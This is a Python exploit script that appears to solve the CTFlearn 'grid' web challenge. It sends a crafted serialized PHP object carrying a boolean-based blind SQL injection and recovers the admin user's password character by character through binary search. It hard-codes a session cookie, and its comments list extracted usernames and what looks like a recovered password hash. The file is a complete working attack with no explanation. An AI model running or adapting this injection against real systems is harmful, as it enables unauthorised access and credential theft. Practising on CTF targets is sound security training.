import requests
import re
import sys
p = re.compile(r'''ID: (.+?)&nbspx:''')
ans = ''
for pos in range(1,33):
    l = 0
    r = 127
    headers = {"Cookie": "PHPSESSID=3sroqgv04f23o1r0d6s7u75lm6"}
    data = {"x": "1", "y": "1"}
    while l<r:
        mid = int((l+r)/2)
        requests.post(
            "https://web.ctflearn.com/grid/controller.php?action=add_point", data=data, headers=headers)
        resp = requests.get("https://web.ctflearn.com/grid/", headers=headers).text
        _id = p.search(resp).group(1)
        payload = _id +  ' and ord(mid((select password from user where username="admin" limit 0, 1), ' +  str(pos) + ',1))>' + str(mid)
        length = len(payload)
        resp = requests.get('''https://web.ctflearn.com/grid/controller.php?action=delete_point&point=O:5:"point":3:{s:1:"x";s:1:"1";s:1:"y";s:1:"1";s:2:"ID";s:'''+str(length)+''':"%s";}'''%payload,headers=headers,allow_redirects=False).text
        resp = requests.get("https://web.ctflearn.com/grid/",headers=headers).text
        if _id not in resp:
            l = mid+1
        else:
            r = mid
    if l==0:
        break
    ans = ans + chr(l)
    print(ans)
    sys.stdout.flush()
    #point,user
    #username,password,uid
    #admin,test,,time,b,yeraisci,bro,bajilak,tes{},1234,tes
    #0c2c99a4ad05d39177c30b30531b119b
